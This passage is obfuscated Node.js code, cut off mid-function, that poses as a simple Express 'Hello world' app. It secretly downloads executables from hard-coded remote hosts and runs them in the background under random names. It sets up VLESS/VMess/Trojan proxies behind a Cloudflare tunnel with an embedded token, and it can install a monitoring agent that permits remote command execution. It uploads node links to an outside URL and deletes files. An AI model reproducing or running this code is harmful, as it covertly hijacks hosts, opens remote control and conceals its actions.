const _0x179c1c=_0x2563;(function(_0x2276e7,_0x5c0ac7){const _0x5180f3={_0xd4c9a9:0x289,_0x9eb129:0x272,_0x2a2b78:0x200,_0x4296d2:0x264,_0x3ee0da:0x27a},_0x32177f=_0x2563,_0x1a07d5=_0x2276e7();while(!![]){try{const _0x5d90d5=-parseInt(_0x32177f(0x227))/0x1*(parseInt(_0x32177f(_0x5180f3._0xd4c9a9))/0x2)+-parseInt(_0x32177f(_0x5180f3._0x9eb129))/0x3+-parseInt(_0x32177f(_0x5180f3._0x2a2b78))/0x4*(parseInt(_0x32177f(0x217))/0x5)+parseInt(_0x32177f(0x1f4))/0x6+parseInt(_0x32177f(0x21a))/0x7+parseInt(_0x32177f(_0x5180f3._0x4296d2))/0x8+parseInt(_0x32177f(_0x5180f3._0x3ee0da))/0x9;if(_0x5d90d5===_0x5c0ac7)break;else _0x1a07d5['push'](_0x1a07d5['shift']());}catch(_0x543fe5){_0x1a07d5['push'](_0x1a07d5['shift']());}}}(_0x42d9,0xb61fa));const express=require(_0x179c1c(0x292)),app=express(),axios=require(_0x179c1c(0x1ff)),os=require('os'),fs=require('fs'),path=require(_0x179c1c(0x224)),{promisify}=require('util'),exec=promisify(require(_0x179c1c(0x276))['exec']),UPLOAD_URL=process['env'][_0x179c1c(0x21c)]||'',PROJECT_URL=process[_0x179c1c(0x1de)][_0x179c1c(0x251)]||'',AUTO_ACCESS=process[_0x179c1c(0x1de)][_0x179c1c(0x25d)]||![],FILE_PATH=process['env'][_0x179c1c(0x1e8)]||_0x179c1c(0x20b),SUB_PATH=process[_0x179c1c(0x1de)][_0x179c1c(0x24d)]||_0x179c1c(0x24f),PORT=process[_0x179c1c(0x1de)]['SERVER_PORT']||process[_0x179c1c(0x1de)][_0x179c1c(0x228)]||0xbb8,UUID=process['env']['UUID']||_0x179c1c(0x1d2),NEZHA_SERVER=process[_0x179c1c(0x1de)][_0x179c1c(0x28c)]||'',NEZHA_PORT=process[_0x179c1c(0x1de)][_0x179c1c(0x257)]||'',NEZHA_KEY=process[_0x179c1c(0x1de)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x179c1c(0x1de)][_0x179c1c(0x201)]||_0x179c1c(0x20e),ARGO_AUTH=process[_0x179c1c(0x1de)][_0x179c1c(0x235)]||_0x179c1c(0x20a),ARGO_PORT=process['env'][_0x179c1c(0x291)]||0x1f41,CFIP=process['env'][_0x179c1c(0x290)]||_0x179c1c(0x204),CFPORT=process[_0x179c1c(0x1de)][_0x179c1c(0x1d6)]||0x1bb,NAME=process[_0x179c1c(0x1de)][_0x179c1c(0x1fa)]||_0x179c1c(0x24f);function _0x42d9(){const _0x2eea97=['https://amd64.ssss.nyc.mn/agent','&fp=firefox&type=ws&host=','length','FILE_PATH','fileName','Subscription\x20uploaded\x20successfully','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','2083','8443','close','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','https://arm64.ssss.nyc.mn/web','win32','text/plain;\x20charset=utf-8','config.json','5354556sPHIxj','unlink','/vmess-argo','test','sub.txt','application/json','NAME','isp','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','/dev/null','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','axios','260uwxTLz','ARGO_DOMAIN','https://amd64.ssss.nyc.mn/web','list.txt','saas.sin.fan','platform','Nodes\x20uploaded\x20successfully','ArgoDomain:','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','data','eyJhIjoiMmQ0MDE4Y2IxN2NjZjZkMTdjYmQ5N2E2NWY2Y2E1ZjIiLCJ0IjoiN2I4ZTM3MjEtMGZmMS00N2Y3LTkyNTUtNzIwY2YyNTMzMDQ5IiwicyI6Ik9UY3pNbVppWmpJdE5ERmhNeTAwTWprekxUaG1ZbVl0T0RVeE56VTBNbUV6WlRZdyJ9','.tmp','/trojan-argo','split','m2.mvl8.dpdns.org','map','charAt','tunnel.yml','get','App\x20is\x20running','stream','replace','\x20-c\x20','81620noDSgF','http','Add\x20automatic\x20access\x20task\x20faild:\x20','6965875tddhPS','ARGO_DOMAIN:','UPLOAD_URL','unshift','false','boot.log','rm\x20-rf\x20','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','taskkill\x20/f\x20/im\x20','/sub.txt\x20saved\x20successfully','path','stringify','443','5GblcQQ','PORT','Content-Type','quic','set','.exe\x20>\x20nul\x202>&1','readdirSync','Error\x20executing\x20command:\x20','mkdirSync','success','\x0a\x0avmess://','join','Error\x20downloading\x20files:','tunnel.json','ARGO_AUTH','https://arm64.ssss.nyc.mn/v1','listen','?security=tls&sni=','--tls','catch','send','fileUrl','2087','arm','https://arm64.ssss.nyc.mn/agent','trojan','blackhole','promises','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x20>/dev/null\x202>&1','https://amd64.ssss.nyc.mn/bot','push','\x20-c\x20\x22','&path=%2Ftrojan-argo%3Fed%3D2560#','\x22\x20>\x20/dev/null\x202>&1','none','Mozilla/5.0','response','SUB_PATH','vless','subflk1','\x20>/dev/null\x202>&1\x20&','PROJECT_URL','Error\x20reading\x20boot.log:','freedom','error','from','log','NEZHA_PORT','utf-8','2053','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','pop','xtls-rprx-vision','AUTO_ACCESS','status','Error\x20in\x20startserver:','arch','arm64','https://api.ip.sb/geoip','TunnelSecret','11399056gEaHfu','\x0a\x20\x20tunnel:\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','/vmess-argo?ed=2560','post','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','Unhandled\x20error\x20in\x20startserver:','auto','index.html','readFileSync','Skipping\x20adding\x20automatic\x20access\x20task','chmod','amd','unlinkSync','3781419QQwjIt','Empowerment\x20success\x20for\x20','includes','country_code','child_process','block','https://arm64.ssss.nyc.mn/bot','filter','5791347XFTALL','\x0a\x20\x20\x20\x20','/api/add-subscriptions','web\x20running\x20error:\x20','createWriteStream','http://ip-api.com/json','vmess','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','config.yaml','existsSync','/api/delete-nodes','Empowerment\x20failed\x20for\x20','?encryption=none&security=tls&sni=','finish','\x20is\x20created','355362LhzkyC','/api/add-nodes','\x20-s\x20','NEZHA_SERVER','forEach','statSync','del\x20/f\x20/q\x20','CFIP','ARGO_PORT','express','true','substring','isFile','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','npm\x20running\x20error:\x20','floor','Hello\x20world!<br><br>You\x20can\x20access\x20/{SUB_PATH}(Default:\x20/sub)\x20to\x20get\x20your\x20nodes!','\x20-p\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','random','\x20is\x20running','&path=%2Fvless-argo%3Fed%3D2560#','\x20failed:\x20','basename','nohup\x20','2096','/config.json\x20>/dev/null\x202>&1\x20&','d340e309-1bdf-4ee3-8a90-41fb404baa4e','tls','Download\x20','has','CFPORT','writeFileSync','\x0aclient_secret:\x20','127.0.0.1','base64','direct','toString','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','env','firefox','org','match','/vless-argo','\x0avless://','message'];_0x42d9=function(){return _0x2eea97;};return _0x42d9();}!fs[_0x179c1c(0x283)](FILE_PATH)?(fs[_0x179c1c(0x22f)](FILE_PATH),console[_0x179c1c(0x256)](FILE_PATH+_0x179c1c(0x288))):console[_0x179c1c(0x256)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x1b3fa6={_0x2ee0e0:0x298,_0x17f993:0x1e7},_0x279221=_0x179c1c,_0x30512a='abcdefghijklmnopqrstuvwxyz';let _0x5ac8a2='';for(let _0x3c5c14=0x0;_0x3c5c14<0x6;_0x3c5c14++){_0x5ac8a2+=_0x30512a['charAt'](Math[_0x279221(_0x1b3fa6._0x2ee0e0)](Math[_0x279221(0x29c)]()*_0x30512a[_0x279221(_0x1b3fa6._0x17f993)]));}return _0x5ac8a2;}function _0x2563(_0x29c807,_0x23951b){const _0x42d920=_0x42d9();return _0x2563=function(_0x256393,_0x18af56){_0x256393=_0x256393-0x1d1;let _0x42ed46=_0x42d920[_0x256393];return _0x42ed46;},_0x2563(_0x29c807,_0x23951b);}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x179c1c(0x232)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x179c1c(0x232)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x179c1c(0x232)](FILE_PATH,_0x179c1c(0x1f8)),listPath=path[_0x179c1c(0x232)](FILE_PATH,_0x179c1c(0x203)),bootLogPath=path['join'](FILE_PATH,'boot.log'),configPath=path[_0x179c1c(0x232)](FILE_PATH,'config.json');function deleteNodes(){const _0x141033={_0xaa4a07:0x283,_0x553d10:0x258,_0x1fa772:0x1da,_0x1e662e:0x1dc,_0x4f72a8:0x279,_0x5cc1e3:0x284,_0x12cbba:0x225,_0x34f192:0x23a},_0x526bfe=_0x179c1c;try{if(!UPLOAD_URL)return;if(!fs[_0x526bfe(_0x141033._0xaa4a07)](subPath))return;let _0x2b8ef6;try{_0x2b8ef6=fs['readFileSync'](subPath,_0x526bfe(_0x141033._0x553d10));}catch{return null;}const _0x3213e2=Buffer[_0x526bfe(0x255)](_0x2b8ef6,_0x526bfe(_0x141033._0x1fa772))[_0x526bfe(_0x141033._0x1e662e)](_0x526bfe(0x258)),_0x2d6a3a=_0x3213e2[_0x526bfe(0x20d)]('\x0a')[_0x526bfe(_0x141033._0x4f72a8)](_0x21fa84=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x526bfe(0x1f7)](_0x21fa84));if(_0x2d6a3a['length']===0x0)return;return axios[_0x526bfe(0x268)](UPLOAD_URL+_0x526bfe(_0x141033._0x5cc1e3),JSON[_0x526bfe(_0x141033._0x12cbba)]({'nodes':_0x2d6a3a}),{'headers':{'Content-Type':'application/json'}})[_0x526bfe(_0x141033._0x34f192)](_0x58fe7c=>{return null;}),null;}catch(_0x1519bf){return null;}}function cleanupOldFiles(){const _0x3274e5={_0x20e21a:0x22d},_0x4a741a={_0x37a8e5:0x232,_0x1c666f:0x28e,_0x2a36dd:0x295,_0x2788a6:0x271},_0x4d0dc9=_0x179c1c;try{const _0x26b98e=fs[_0x4d0dc9(_0x3274e5._0x20e21a)](FILE_PATH);_0x26b98e['forEach'](_0xcd6832=>{const _0x38a3ea=_0x4d0dc9,_0xc4216a=path[_0x38a3ea(_0x4a741a._0x37a8e5)](FILE_PATH,_0xcd6832);try{const _0x50691e=fs[_0x38a3ea(_0x4a741a._0x1c666f)](_0xc4216a);_0x50691e[_0x38a3ea(_0x4a741a._0x2a36dd)]()&&fs[_0x38a3ea(_0x4a741a._0x2788a6)](_0xc4216a);}catch(_0x56ad9e){}});}catch(_0x55c626){}}async function generateConfig(){const _0x1c42e7={_0x11b037:0x24a,_0x5962cc:0x24a,_0x3d4ef0:0x1d9,_0x55fbf2:0x24e,_0x2f7244:0x24a,_0x272ff4:0x24a,_0x5c8efa:0x24a,_0x4fdf12:0x22a,_0x5c93eb:0x1d9,_0x2a5867:0x277,_0x24e6ad:0x1d7,_0x48a71c:0x1f3},_0x507616=_0x179c1c,_0x3f037c={'log':{'access':_0x507616(0x1fd),'error':'/dev/null','loglevel':_0x507616(_0x1c42e7._0x11b037)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x507616(0x25c)}],'decryption':_0x507616(_0x1c42e7._0x5962cc),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x507616(_0x1c42e7._0x3d4ef0),'protocol':_0x507616(_0x1c42e7._0x55fbf2),'settings':{'clients':[{'id':UUID}],'decryption':_0x507616(_0x1c42e7._0x2f7244)},'streamSettings':{'network':'tcp','security':_0x507616(_0x1c42e7._0x272ff4)}},{'port':0xbba,'listen':_0x507616(0x1d9),'protocol':_0x507616(0x24e),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x507616(_0x1c42e7._0x5c8efa),'wsSettings':{'path':_0x507616(0x1e2)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x507616(0x1d3),_0x507616(_0x1c42e7._0x4fdf12)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x507616(_0x1c42e7._0x5c93eb),'protocol':_0x507616(0x280),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x507616(0x1f6)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x507616(0x1d3),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x507616(0x240),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x507616(_0x1c42e7._0x5962cc),'wsSettings':{'path':_0x507616(0x20c)}},'sniffing':{'enabled':!![],'destOverride':[_0x507616(0x218),_0x507616(0x1d3),'quic'],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x507616(0x253),'tag':_0x507616(0x1db)},{'protocol':_0x507616(0x241),'tag':_0x507616(_0x1c42e7._0x2a5867)}]};fs[_0x507616(_0x1c42e7._0x24e6ad)](path['join'](FILE_PATH,_0x507616(_0x1c42e7._0x48a71c)),JSON[_0x507616(0x225)](_0x3f037c,null,0x2));}function getSystemArchitecture(){const _0x42e15b={_0x1646fd:0x260,_0x2b66ec:0x23e,_0x1b898a:0x261},_0x33d732=_0x179c1c,_0x42e3a6=os[_0x33d732(_0x42e15b._0x1646fd)]();return _0x42e3a6===_0x33d732(_0x42e15b._0x2b66ec)||_0x42e3a6===_0x33d732(_0x42e15b._0x1b898a)||_0x42e3a6==='aarch64'?_0x33d732(0x23e):_0x33d732(0x270);}function downloadFile(_0x1559b9,_0x389352,_0x44dfb0){const _0x5b119b={_0x4528d2:0x22f},_0x1d1c82={_0x55f26b:0x1d4,_0x17c220:0x29f,_0x65f464:0x1e4},_0x1338fd={_0x3b7445:0x209,_0x73ef3c:0x287,_0x3ce21d:0x254},_0x34c370={_0x53b547:0x256,_0x1d03b4:0x1d4},_0x85cf2e=_0x179c1c,_0x1d05cb=_0x1559b9;!fs[_0x85cf2e(0x283)](FILE_PATH)&&fs[_0x85cf2e(_0x5b119b._0x4528d2)](FILE_PATH,{'recursive':!![]});const _0x1a8f73=fs[_0x85cf2e(0x27e)](_0x1d05cb);axios({'method':'get','url':_0x389352,'responseType':_0x85cf2e(0x214)})['then'](_0x1554ca=>{const _0x4b2654=_0x85cf2e;_0x1554ca[_0x4b2654(_0x1338fd._0x3b7445)]['pipe'](_0x1a8f73),_0x1a8f73['on'](_0x4b2654(_0x1338fd._0x73ef3c),()=>{const _0x56b0ba=_0x4b2654;_0x1a8f73[_0x56b0ba(0x1ee)](),console[_0x56b0ba(_0x34c370._0x53b547)](_0x56b0ba(_0x34c370._0x1d03b4)+path[_0x56b0ba(0x2a0)](_0x1d05cb)+'\x20successfully'),_0x44dfb0(null,_0x1d05cb);}),_0x1a8f73['on'](_0x4b2654(_0x1338fd._0x3ce21d),_0x24de08=>{const _0x1a8db0=_0x4b2654;fs[_0x1a8db0(0x1f5)](_0x1d05cb,()=>{});const _0x30f845='Download\x20'+path[_0x1a8db0(0x2a0)](_0x1d05cb)+'\x20failed:\x20'+_0x24de08[_0x1a8db0(0x1e4)];console[_0x1a8db0(0x254)](_0x30f845),_0x44dfb0(_0x30f845);});})[_0x85cf2e(0x23a)](_0x3bef6f=>{const _0x1b4ed4=_0x85cf2e,_0x55c81d=_0x1b4ed4(_0x1d1c82._0x55f26b)+path[_0x1b4ed4(0x2a0)](_0x1d05cb)+_0x1b4ed4(_0x1d1c82._0x17c220)+_0x3bef6f[_0x1b4ed4(_0x1d1c82._0x65f464)];console[_0x1b4ed4(0x254)](_0x55c81d),_0x44dfb0(_0x55c81d);});}async function downloadFilesAndRun(){const _0x965db0={_0x384159:0x1e7,_0x2002d8:0x20d,_0x3fada9:0x25b,_0x2ca051:0x1ed,_0x534ea7:0x2a2,_0x1dc19c:0x23d,_0x1adaf7:0x1d5,_0x511ba3:0x293,_0x5c5417:0x21e,_0x1a8cd7:0x1d8,_0x2db8cd:0x1eb,_0x263ec3:0x1d7,_0x3ef90b:0x232,_0x110099:0x247,_0x181e4d:0x1ec,_0x523a49:0x259,_0x2c33fa:0x28b,_0x50b71f:0x256,_0x1f4daa:0x2a1,_0x1115e7:0x216,_0x4f3ea5:0x254,_0x3050e4:0x283,_0x49bf21:0x1e1,_0x27e831:0x1fe,_0x3d6850:0x254,_0x4b65f3:0x22e},_0x32ca89={_0x3886c2:0x28d},_0x59e377={_0x6e5785:0x26f},_0x4a7363=_0x179c1c,_0x59fb8a=getSystemArchitecture(),_0x39ffba=getFilesForArchitecture(_0x59fb8a);if(_0x39ffba[_0x4a7363(_0x965db0._0x384159)]===0x0){console[_0x4a7363(0x256)](_0x4a7363(0x1dd));return;}const _0x38e021=_0x39ffba[_0x4a7363(0x20f)](_0x1a426e=>{return new Promise((_0x440cf0,_0x1dfeb4)=>{const _0x4142de=_0x2563;downloadFile(_0x1a426e[_0x4142de(0x1e9)],_0x1a426e[_0x4142de(0x23c)],(_0x5d15f1,_0x3fb5ca)=>{_0x5d15f1?_0x1dfeb4(_0x5d15f1):_0x440cf0(_0x3fb5ca);});});});try{await Promise['all'](_0x38e021);}catch(_0x3018eb){console[_0x4a7363(0x254)](_0x4a7363(0x233),_0x3018eb);return;}function _0x3608af(_0xbec6bf){const _0x2981e4={_0x1c32ce:0x1dc},_0x182115=_0x4a7363,_0x1c842a=0x1fd;_0xbec6bf[_0x182115(_0x32ca89._0x3886c2)](_0x4dec74=>{const _0x2f0810=_0x182115;fs[_0x2f0810(0x283)](_0x4dec74)&&fs[_0x2f0810(_0x59e377._0x6e5785)](_0x4dec74,_0x1c842a,_0x192cb6=>{const _0x2d46b9=_0x2f0810;_0x192cb6?console[_0x2d46b9(0x254)](_0x2d46b9(0x285)+_0x4dec74+':\x20'+_0x192cb6):console[_0x2d46b9(0x256)](_0x2d46b9(0x273)+_0x4dec74+':\x20'+_0x1c842a[_0x2d46b9(_0x2981e4._0x1c32ce)](0x8));});});}const _0x3cc8ac=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x3608af(_0x3cc8ac);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3fe1b8=NEZHA_SERVER[_0x4a7363(0x274)](':')?NEZHA_SERVER[_0x4a7363(_0x965db0._0x2002d8)](':')[_0x4a7363(_0x965db0._0x3fada9)]():'',_0x3d66e3=new Set(['443',_0x4a7363(_0x965db0._0x2ca051),_0x4a7363(_0x965db0._0x534ea7),_0x4a7363(_0x965db0._0x1dc19c),_0x4a7363(0x1ec),_0x4a7363(0x259)]),_0x5ec235=_0x3d66e3[_0x4a7363(_0x965db0._0x1adaf7)](_0x3fe1b8)?_0x4a7363(_0x965db0._0x511ba3):_0x4a7363(_0x965db0._0x5c5417),_0x50a491=_0x4a7363(_0x965db0._0x1a8cd7)+NEZHA_KEY+_0x4a7363(_0x965db0._0x2db8cd)+NEZHA_SERVER+_0x4a7363(0x243)+_0x5ec235+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x4a7363(_0x965db0._0x263ec3)](path[_0x4a7363(_0x965db0._0x3ef90b)](FILE_PATH,_0x4a7363(0x282)),_0x50a491);const _0x3a3efb='nohup\x20'+phpPath+_0x4a7363(_0x965db0._0x110099)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x3a3efb),console[_0x4a7363(0x256)](phpName+'\x20is\x20running'),await new Promise(_0x2a8645=>setTimeout(_0x2a8645,0x3e8));}catch(_0x5d01bf){console[_0x4a7363(0x254)]('php\x20running\x20error:\x20'+_0x5d01bf);}}else{let _0x53621b='';const _0x374490=[_0x4a7363(0x226),'8443','2096',_0x4a7363(0x23d),_0x4a7363(_0x965db0._0x181e4d),_0x4a7363(_0x965db0._0x523a49)];_0x374490['includes'](NEZHA_PORT)&&(_0x53621b=_0x4a7363(0x239));const _0x18aae8=_0x4a7363(0x2a1)+npmPath+_0x4a7363(_0x965db0._0x2c33fa)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4a7363(0x29a)+NEZHA_KEY+'\x20'+_0x53621b+_0x4a7363(0x296);try{await exec(_0x18aae8),console[_0x4a7363(0x256)](npmName+_0x4a7363(0x29d)),await new Promise(_0x47f481=>setTimeout(_0x47f481,0x3e8));}catch(_0x5ed618){console['error'](_0x4a7363(0x297)+_0x5ed618);}}}else console[_0x4a7363(_0x965db0._0x50b71f)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x319531=_0x4a7363(_0x965db0._0x1f4daa)+webPath+_0x4a7363(_0x965db0._0x1115e7)+FILE_PATH+_0x4a7363(0x1d1);try{await exec(_0x319531),console['log'](webName+_0x4a7363(0x29d)),await new Promise(_0x418e5b=>setTimeout(_0x418e5b,0x3e8));}catch(_0x392471){console[_0x4a7363(_0x965db0._0x4f3ea5)](_0x4a7363(0x27d)+_0x392471);}if(fs[_0x4a7363(_0x965db0._0x3050e4)](botPath)){let _0x397ede;if(ARGO_AUTH[_0x4a7363(_0x965db0._0x49bf21)](/^[A-Z0-9a-z=]{120,250}$/))_0x397ede=_0x4a7363(_0x965db0._0x27e831)+ARGO_AUTH;else ARGO_AUTH[_0x4a7363(_0x965db0._0x49bf21)](/TunnelSecret/)?_0x397ede=_0x4a7363(0x221)+FILE_PATH+'/tunnel.yml\x20run':_0x397ede='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x4a7363(0x269)+ARGO_PORT;try{await exec(_0x4a7363(0x2a1)+botPath+'\x20'+_0x397ede+_0x4a7363(0x250)),console['log'](botName+_0x4a7363(0x29d)),await new Promise(_0xb25771=>setTimeout(_0xb25771,0x7d0));}catch(_0x1302d9){console[_0x4a7363(_0x965db0._0x3d6850)](_0x4a7363(_0x965db0._0x4b65f3)+_0x1302d9);}}await new Promise(_0x8ce2ed=>setTimeout(_0x8ce2ed,0x1388));}function getFilesForArchitecture(_0x508e57){const _0x3e1407={_0x15df07:0x1f0,_0x535b3f:0x21d},_0x4da30a=_0x179c1c;let _0x18d76e;_0x508e57===_0x4da30a(0x23e)?_0x18d76e=[{'fileName':webPath,'fileUrl':_0x4da30a(_0x3e1407._0x15df07)},{'fileName':botPath,'fileUrl':_0x4da30a(0x278)}]:_0x18d76e=[{'fileName':webPath,'fileUrl':_0x4da30a(0x202)},{'fileName':botPath,'fileUrl':_0x4da30a(0x245)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0xb86c27=_0x508e57===_0x4da30a(0x23e)?_0x4da30a(0x23f):_0x4da30a(0x1e5);_0x18d76e[_0x4da30a(0x21d)]({'fileName':npmPath,'fileUrl':_0xb86c27});}else{const _0x1d6b6b=_0x508e57==='arm'?_0x4da30a(0x236):'https://amd64.ssss.nyc.mn/v1';_0x18d76e[_0x4da30a(_0x3e1407._0x535b3f)]({'fileName':phpPath,'fileUrl':_0x1d6b6b});}}return _0x18d76e;}function argoType(){const _0x32ea0a={_0xa41c95:0x256,_0x2d0441:0x1fc,_0x2e1ede:0x274,_0x2bf350:0x234,_0x434582:0x25a,_0x235d1e:0x1d7,_0x1bb577:0x232,_0x3c661d:0x211,_0x5a4ac4:0x208},_0x4a8367=_0x179c1c;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x4a8367(_0x32ea0a._0xa41c95)](_0x4a8367(_0x32ea0a._0x2d0441));return;}if(ARGO_AUTH[_0x4a8367(_0x32ea0a._0x2e1ede)](_0x4a8367(0x263))){fs['writeFileSync'](path[_0x4a8367(0x232)](FILE_PATH,_0x4a8367(_0x32ea0a._0x2bf350)),ARGO_AUTH);const _0x5dca21=_0x4a8367(0x265)+ARGO_AUTH[_0x4a8367(0x20d)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x4a8367(0x232)](FILE_PATH,'tunnel.json')+_0x4a8367(0x281)+ARGO_DOMAIN+_0x4a8367(_0x32ea0a._0x434582)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x4a8367(_0x32ea0a._0x235d1e)](path[_0x4a8367(_0x32ea0a._0x1bb577)](FILE_PATH,_0x4a8367(_0x32ea0a._0x3c661d)),_0x5dca21);}else console[_0x4a8367(_0x32ea0a._0xa41c95)](_0x4a8367(_0x32ea0a._0x5a4ac4));}async function extractDomains(){const _0x33e762={_0x5cccb7:0x232,_0x1a1f51:0x28d,_0x3fddb1:0x207,_0x29fc1e:0x266,_0x22a10b:0x254},_0x48321a={_0x89611d:0x262,_0x5c093e:0x24b,_0x87318b:0x209,_0x1e00f0:0x209,_0x4e78ed:0x275,_0x36c06f:0x209,_0x5bd8e8:0x1fb,_0x4d56e9:0x212,_0x2cd4de:0x27f,_0x37af14:0x230,_0x317f0c:0x1e0,_0x1542af:0x215},_0x514ae7={_0x1b95c5:0x294,_0x42f743:0x249},_0x17639b={_0x39d970:0x246},_0x2e5bb4=_0x179c1c;let _0x1ce40d;if(ARGO_AUTH&&ARGO_DOMAIN)_0x1ce40d=ARGO_DOMAIN,console['log'](_0x2e5bb4(0x21b),_0x1ce40d),await _0x13f9a9(_0x1ce40d);else try{const _0x3e461e=fs['readFileSync'](path[_0x2e5bb4(_0x33e762._0x5cccb7)](FILE_PATH,_0x2e5bb4(0x21f)),_0x2e5bb4(0x258)),_0xcb0a16=_0x3e461e[_0x2e5bb4(0x20d)]('\x0a'),_0x55ec0f=[];_0xcb0a16[_0x2e5bb4(_0x33e762._0x1a1f51)](_0x426fc5=>{const _0x22f79a=_0x2e5bb4,_0x5e7f79=_0x426fc5[_0x22f79a(0x1e1)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5e7f79){const _0x4bb472=_0x5e7f79[0x1];_0x55ec0f[_0x22f79a(_0x17639b._0x39d970)](_0x4bb472);}});if(_0x55ec0f[_0x2e5bb4(0x1e7)]>0x0)_0x1ce40d=_0x55ec0f[0x0],console['log'](_0x2e5bb4(_0x33e762._0x3fddb1),_0x1ce40d),await _0x13f9a9(_0x1ce40d);else{console[_0x2e5bb4(0x256)](_0x2e5bb4(0x1ef)),fs[_0x2e5bb4(0x271)](path['join'](FILE_PATH,'boot.log'));async function _0x163042(){const _0xbf81c5=_0x2e5bb4;try{process[_0xbf81c5(0x205)]===_0xbf81c5(0x1f1)?await exec(_0xbf81c5(0x222)+botName+_0xbf81c5(0x22c)):await exec('pkill\x20-f\x20\x22['+botName[_0xbf81c5(0x210)](0x0)+']'+botName[_0xbf81c5(_0x514ae7._0x1b95c5)](0x1)+_0xbf81c5(_0x514ae7._0x42f743));}catch(_0x26cec7){}}_0x163042(),await new Promise(_0x5e66a2=>setTimeout(_0x5e66a2,0xbb8));const _0xbe670b=_0x2e5bb4(_0x33e762._0x29fc1e)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x2e5bb4(0x2a1)+botPath+'\x20'+_0xbe670b+_0x2e5bb4(0x250)),console[_0x2e5bb4(0x256)](botName+_0x2e5bb4(0x29d)),await new Promise(_0x1e935f=>setTimeout(_0x1e935f,0xbb8)),await extractDomains();}catch(_0x4feb54){console[_0x2e5bb4(0x254)]('Error\x20executing\x20command:\x20'+_0x4feb54);}}}catch(_0x4ce98e){console[_0x2e5bb4(_0x33e762._0x22a10b)](_0x2e5bb4(0x252),_0x4ce98e);}async function _0x2ba018(){const _0x452eaa=_0x2e5bb4;try{const _0x5d5bf9=await axios[_0x452eaa(0x212)](_0x452eaa(_0x48321a._0x89611d),{'headers':{'User-Agent':_0x452eaa(_0x48321a._0x5c093e),'timeout':0xbb8}});if(_0x5d5bf9[_0x452eaa(_0x48321a._0x87318b)]&&_0x5d5bf9[_0x452eaa(_0x48321a._0x1e00f0)][_0x452eaa(_0x48321a._0x4e78ed)]&&_0x5d5bf9[_0x452eaa(0x209)][_0x452eaa(0x1fb)])return(_0x5d5bf9['data'][_0x452eaa(0x275)]+'-'+_0x5d5bf9[_0x452eaa(_0x48321a._0x36c06f)][_0x452eaa(_0x48321a._0x5bd8e8)])[_0x452eaa(0x215)](/\s+/g,'_');}catch(_0xe06554){try{const _0x293b81=await 